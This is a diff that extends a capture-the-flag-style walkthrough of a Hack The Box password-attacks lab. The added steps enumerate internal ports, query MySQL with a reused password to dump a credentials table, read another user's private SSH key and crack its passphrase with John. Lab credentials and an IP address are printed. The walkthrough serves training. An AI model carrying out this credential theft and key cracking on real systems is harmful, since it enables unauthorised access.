@@ -89,4 +89,57 @@ http://localhost:8080/cms
 
 >Gain access to target as `jason` via ssh with the password `C4mNKjAtL2dydsYa6`.  
 
+>Based on the document discovered, enumeration indicate local internal HTTP service on port 8080.
+
+### Local Service Discovery  
+
+>[Dynamic Port Forwarding with SSH and SOCKS Tunneling](https://academy.hackthebox.com/module/158/section/1426)  
+>`netstat` and `ss` commands to determine internal ports not accessible on victim from kali externally.   
+
+```
+netstat -antup
+
+ss -tulpn
+```  
+
+![netstat-Password-Attacks-Lab-Medium](/images/netstat-Password-Attacks-Lab-Medium.png)  
+
+>Discovered MySQL on port 3306 internally.
+>Using credentials for `jason` and password of `C4mNKjAtL2dydsYa6` to connect locally to SQL.  
+
+```
+mysql -u jason -p
+
+show databases;
+use users;
+show tables;
+
+select * from creds where name like 'dennis';
+```  
+
+![SQL-Password-Attacks-Lab-Medium](/images/SQL-Password-Attacks-Lab-Medium.png)  
+
+## Lateral Movement  
+
+>Logged in as `dennis` user with the discovered crednetials on the internal MySQL service, creds table.
+
+```
+su dennis
+
+cd /home/dennis/.ssh
+cat id_rsa
+```   
+
+>Crack the id_rsa key password for `dennis` using John.  
+
+```
+ssh2john id_rsa_dennis.ssh > ssh.hash
+
+john ssh.hash --wordlist=../mut_password.list
+
+ssh dennis@10.129.202.221 -i id_rsa_dennis.ssh
+```
+
+
+
 
